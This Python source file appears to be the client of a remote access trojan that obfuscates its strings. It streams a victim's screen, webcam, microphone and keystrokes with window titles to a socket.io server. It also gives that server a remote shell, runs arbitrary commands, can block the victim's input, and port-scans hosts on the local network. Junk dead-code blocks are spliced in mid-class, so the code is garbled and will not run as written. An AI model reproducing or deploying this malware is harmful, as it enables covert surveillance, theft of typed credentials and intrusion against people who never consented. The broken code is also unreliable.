_s566 = "OEhZW1NdTEs="
_s567 = "QzAvLDQvLDEqMA=="
_s568 = "BHRlZ29hcHc="
_s569 = "A1NmcWpsZ2pgYm9veiNwZm1nI3B3YndwI3dsI3drZiNwZnF1ZnEt"
_s570 = "oNPUwdLU/9TJzcU="
_s571 = "p9fGxMzC09Q="
_s572 = "UzcyJzIMMSonNiA="
_s573 = "Kk5ORVl1WE9ZX0Ze"
_s574 = "Tj06Lzo9"
_s575 = "sMDR09vVxMM="
_s576 = "fxseCx4gEh0="
_s577 = "qM3Eydjbzcw="
_s578 = "D11OXH9nan1qL0xjZmphew=="
_s579 = "ORQUSlxLT1xL"
_s580 = "2vf3qb+5qL+u"
_s581 = "w+7uqqc="
_s582 = "HjMzbHt9cXBwe31q"
_s583 = "q4aGwsXY38rHxw=="
_s584 = "vJGRydLV0s/I3dDQ"
_s585 = "hqur6Omr9uP09e/18g=="
_s586 = "wO3tpayltqG0paQ="
_s587 = "ByoqaWgqYmticWZzYg=="
_s588 = "wsiZ6Z/ikqewsauxtqesoafisKevrbSnpuzI"
_s589 = "R00cahpnCShnNyI1NC40MyIpJCJnISgyKSNpTQ=="
_s590 = "6K26uqe60sjFxZuNmp6NmsiJhozIxcWbjYuajZzImo2ZnYGajYzIjoeayMXFgYabnImEhA=="
_s591 = "1N6P/4n0hLGmp72noLG6t7H0vbqnoLW4uLGw9fSVoaC7+aegtaag9Lu69La7u6D63g=="
_s592 = "rKb3gfGM5cLf2M3AwIzKzcXAyciCjP7ZwozN34zNyMHFwoKm"
_s593 = "ST4gJ3p7"
_s594 = "jcPi+a3s6eDk462grez5+ejg/fnk4+qt/uTh6OP5rdjMzq3v9P3s/v6jo6M="
_s595 = "QBthHWAVAQNgIjkwITMzYCYhKSwlJGBtYDI1Li4pLidgNyk0KGAsKS0pNCUkYDAyKTYpLCUnJTM="
_s596 = "yImkuq2prLHour2mpqGmr+ipu+iprKWhpg=="
_s597 = "BGFoYXJlcGFg"
_s598 = "Dlx7YGBnYGkua2JreG96a2ouIy5tYmtvYGdgaS57fi5bT00ubHd+b319LnxraWd9enx3ICAg"
_s599 = "C1AgVitbbnl4Ynh/bmVobit5bm15bnhjbm8="
_s600 = "wZrgnOGRpLOyqLK1pK+ipOGsoLjhqaC3pOGxoLO1qKCtrbjhp6CoraSl4emztK/hoLLhoKWsqK/hp66z4ZKiqaSltK2kpeGVoLKq6A=="
_s601 = "76q9vaC91c+8ipvPsLyqvbmqvc+Ggc+MgIuKz4Cdz5qcis/CwpyKnZmKnQ=="
_s602 = "ruv8/OH8lI79y9qO8f3r7fzr+o7HwI7NwcrLjsHcjtvdy46Dg93LzdzL2g=="
_s603 = "fT4SExMYHgkYGVxdKhwUCRQTGl0bEg9dHhIQEBwTGQ5TU1M="
_s604 = "peDdzNHMy8KFw8rXhdDVwcTRwIuLiw=="
_s605 = "zZ6luLmporqj"
_s606 = "qfrdxtnZzM0="
_s607 = "WQYGNDgwNwYG"
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
       _D("_s6"): False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s7")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s8")] = True
except: pass
try: import pyperclip; HAS[_D("_s9")] = True
except: pass
try: import psutil; HAS[_D("_s10")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import pyaudio; HAS[_D("_s11")] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS[_D("_s12")] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s13")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s14"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s15")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
        except: pass
        try:
            if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s18")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s20") and not HAS["mss"]: return
        if self.src == _D("_s21") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s22")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s23"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s24"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s25"))
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s26"), quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s27")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s28"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s29")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s30"): b64, "format": "jpeg"})
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class MicEngine:
    ""_D("_s31")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None
    def start(self):
        if self.r: return
        if not HAS[_D("_s32")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s33"), {"active": False, "error": "pyaudio not installed on target"})
            return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            _l.error(f"Mic init error: {e}"); self.stop()
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s34"), {"active": False, "error": str(e)})
            return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s35"), {"active": True})
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None
    @staticmethod
    def _make_wav(pcm_data):
        ""_D("_s36")""
        import struct
        data_len = len(pcm_data)
        header = struct.pack(_D("_s37"),
            b_D("_s38"), 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b_D("_s39"), data_len)
        return header + pcm_data
    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s40"), {"audio": b64})
            except Exception as e:
                _l.error(f"Mic err: {e}")
                time.sleep(0.1)
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS[_D("_s41")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s42"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s43"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s44"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s45"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s46"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s47"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s48"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s49")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s50")) else None,
                    env={**os.environ, _D("_s51"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s52"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s53"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s54"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s55"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s56"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s57"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s58")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write(_D("_s59")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: _l.error(f"Term write: {e}")
class Keylog:
    ""_D("_s60")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""
    def start(self):
        if self.r or not HAS[_D("_s61")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s62"), {"active": False, "error": "pynput not available"})
            return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s63"), {"active": True})
    def stop(self):
        self.r = False; self._flush()  
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s64"), {"active": False})
    def _active_window(self):
        try:
            if sys.platform == _D("_s65"):
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""
    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, _D("_s66")) and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass
    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit(_D("_s67"), {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []
    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()
def _proc(): return [{"pid": p.info["pid"], _D("_s68"): p.info["name"] or "?",
    "cpu": p.info[_D("_s69")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s70"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s71")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s72")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s73"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s74")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s75")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s76") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s77"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s78") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s79"):
            subprocess.run([_D("_s80"),"-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [[_D("_s81"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s82") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s83"):
            subprocess.run([_D("_s84"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s85"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s86")""
    is_url = path.startswith(_D("_s87")) or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s88"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s89")
    try:
        if sys.platform == _D("_s90"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s91")
        elif sys.platform == _D("_s92"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s93"), "-e", script], capture_output=True)
            return True, _D("_s94")
        else:
            for cmd in [
                [_D("_s95"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s96"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s97")
                except: continue
            return False, _D("_s98")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s99")""
    try:
        if sys.platform == _D("_s100"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s101"):
            subprocess.run([_D("_s102"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s103"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s104")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s105")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s106")""
    if not HAS["mss"]: return None, _D("_s107")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s108"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s109")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s110"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s111"): str(e)}
def _apps():
    ""_D("_s112")""
    apps = []
    if sys.platform == _D("_s113"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s114"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s115"):
        r = subprocess.run([_D("_s116"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s117"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
    ""_D("_s118")""
    try:
        if sys.platform == _D("_s119"):
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s120")
        else:
            subprocess.run([_D("_s121"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s122")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s123")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s124")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s125"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s126")""
    if sys.platform != _D("_s127"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s128") if block else "Input unblocked"
        return False, _D("_s129") if block else "Unblock failed"
    except Exception as e: return False, str(e)
_COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: _D("_s130"), 25: 'SMTP', 53: 'DNS',
    80: _D("_s131"), 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
    443: _D("_s132"), 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
    3306: _D("_s133"), 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
    6379: _D("_s134"), 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9090: 'Web-Alt',
    27017: _D("_s135"), 515: 'LPD/Printer', 631: 'IPP/Printer', 9100: 'JetDirect/Printer',
    548: 'AFP', 5000: _D("_s136"), 5353: 'mDNS', 7000: 'AirPlay',
    1900: _D("_s137"), 5357: 'WSD', 8000: 'HTTP-Alt', 8888: 'HTTP-Alt',
    8008: _D("_s138"), 8009: 'Chromecast', 554: 'RTSP',
}
_MAC_OUI = {
    _D("_s139"): 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link', 'A4:2B:B0': 'TP-Link',
    _D("_s140"): 'Synology', '00:25:90': 'Supermicro',
    _D("_s141"): 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP', '70:5A:0F': 'HP',
    _D("_s142"): 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
    _D("_s143"): 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell', 'F0:D5:BF': 'Dell',
    _D("_s144"): 'ASUS', '0C:9D:92': 'ASUS', 'E0:CB:4E': 'ASUS',
    _D("_s145"): 'Google', '54:60:09': 'Google',
    _D("_s146"): 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
    _D("_s147"): 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
    _D("_s148"): 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
    _D("_s149"): 'VMware', '08:00:27': 'VirtualBox',
    _D("_s150"): 'Canon', '00:26:73': 'RICOH', '00:1C:C4': 'Brother',
    _D("_s151"): 'Cisco-Linksys', '00:23:69': 'Cisco-Linksys',
    _D("_s152"): 'Microsoft', '00:15:5D': 'Microsoft',
    _D("_s153"): 'VMware', '00:1C:42': 'Parallels',
    _D("_s154"): 'Apple', 'A4:D1:D2': 'Apple',
    _D("_s155"): 'Apple', '00:25:BC': 'Apple',
    _D("_s156"): 'Samsung', 'CC:3A:61': 'Samsung',
    _D("_s157"): 'Sony', '00:0D:D0': 'Sony',
    _D("_s158"): 'Sony', 'BC:30:D9': 'Sony',
    _D("_s159"): 'Microsoft', '58:82:A8': 'Microsoft',
    _D("_s160"): 'QNAP', '00:08:9B': 'QNAP',
    _D("_s161"): 'Roku', 'B0:A7:37': 'Roku',
    _D("_s162"): 'Apple', '54:26:96': 'Apple',
}
def _classify_machine(ip, mac_vendor, open_ports):
    ""_D("_s163")""
    ports = set(open_ports)
    parts = ip.split('.')
    is_gw = len(parts) == 4 and int(parts[3]) in (1, 254)
    if is_gw:
        return _D("_s164"), '📡', 'Router / Gateway'
    has_windows = 445 in ports or 135 in ports or 139 in ports
    has_rdp = 3389 in ports
    has_ssh = 22 in ports
    has_web = 80 in ports or 443 in ports or 8080 in ports or 8443 in ports
    has_printer = 515 in ports or 631 in ports or 9100 in ports
    has_db = 3306 in ports or 5432 in ports or 27017 in ports or 6379 in ports
    has_nas = 548 in ports  
    has_upnp = 5000 in ports or 1900 in ports
    if has_printer:
        return _D("_s165"), '🖨️', 'Printer'
    if has_ssh and has_web:
        return _D("_s166"), '🐧', 'Linux Web Server'
    if has_ssh:
        return _D("_s167"), '🐧', 'Linux/Unix Server'
    if has_windows and has_rdp:
        return _D("_s168"), '🪟', 'Windows PC'
    if has_windows and has_web:
        if has_nas or mac_vendor.lower() in (_D("_s169"), 'qnap', 'western digital', 'seagate'):
            return 'nas', '🗄️', _D("_s170")
        return _D("_s171"), '🪟', 'Windows Server'
    if has_rdp:
        return _D("_s172"), '🪟', 'Windows PC (RDP)'
    if has_windows:
        return _D("_s173"), '🪟', 'Windows PC'
    if has_db:
        return _D("_s174"), '🗃️', 'Database Server'
    if has_web:
        if mac_vendor.lower() in (_D("_s175"), 'd-link', 'netgear', 'asus', 'cisco', 'linksys', 'belkin'):
            return _D("_s176"), '📡', 'Router / AP'
        return _D("_s177"), '🌐', 'Web Server'
    if has_upnp:
        return 'iot', '📱', _D("_s178")
    vendor_lower = mac_vendor.lower()
    if any(x in vendor_lower for x in (_D("_s179"), 'samsung', 'xiaomi', 'huawei', 'oneplus')):
        return _D("_s180"), '📱', 'Mobile Device'
    if any(x in vendor_lower for x in (_D("_s181"), 'amazon', 'nest', 'ring', 'arlo', 'wyze')):
        return 'iot', '🏠', _D("_s182")
    if any(x in vendor_lower for x in (_D("_s183"), 'arduino')):
        return _D("_s184"), '🥧', 'Embedded Linux'
    if any(x in vendor_lower for x in (_D("_s185"), 'lg', 'samsung', 'roku', 'vizio')):
        return 'iot', '📺', _D("_s186")
    if any(x in vendor_lower for x in ('hp', _D("_s187"), 'canon', 'epson', 'xerox')):
        return _D("_s188"), '🖨️', 'Printer'
    return _D("_s189"), '❓', 'Unknown Device'
def _scan_ports(ip, ports, timeout=0.4):
    ""_D("_s190")""
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                open_ports.append(port)
        except:
            pass
    return open_ports
def _network_info():
    ""_D("_s191")""
    info = {_D("_s192"): [], "connections": [], "arp": [], "local_network": [], "external_hosts": []}
    try:
        if HAS[_D("_s193")]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {_D("_s194"): name, "addresses": []}
                for addr in addrs:
                    iface[_D("_s195")].append({
                        _D("_s196"): str(addr.family),
                        _D("_s197"): addr.address,
                        _D("_s198"): addr.netmask or "",
                        _D("_s199"): addr.broadcast or ""
                    })
                info[_D("_s200")].append(iface)
    except Exception as e: info[_D("_s201")] = str(e)
    try:
        if HAS[_D("_s202")]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info[_D("_s203")].append({
                    "fd": conn.fd or -1,
                    _D("_s204"): str(conn.family),
                    _D("_s205"): str(conn.type),
                    _D("_s206"): f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    _D("_s207"): f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    _D("_s208"): conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info[_D("_s209")] = str(e)
    try:
        if sys.platform == _D("_s210"):
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == _D("_s211") else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and (_D("_s212") in line.lower() or "static" in line.lower()
                             or _D("_s213") in line.lower() or "statique" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), _D("_s214"): parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info[_D("_s215")] = str(e)
    port_list = sorted(_COMMON_PORTS.keys())
    for arp_entry in info["arp"]:
        if not isinstance(arp_entry, dict) or not arp_entry.get("ip"):
            continue
        ip = arp_entry["ip"]
        mac = arp_entry.get("mac", "")
        if ip.startswith(_D("_s216")) or ip.startswith("239.") or ip.startswith("255.") or ip == "0.0.0.0":
            continue
        mac_vendor = _D("_s217")
        if mac:
            parts_mac = mac.replace("-", ":").upper().split(":")
            if len(parts_mac) >= 3:
                oui = ":".join(parts_mac[:3])
                mac_vendor = _MAC_OUI.get(oui, _D("_s218"))
        open_ports = _scan_ports(ip, port_list)
        open_services = {p: _COMMON_PORTS[p] for p in open_ports}
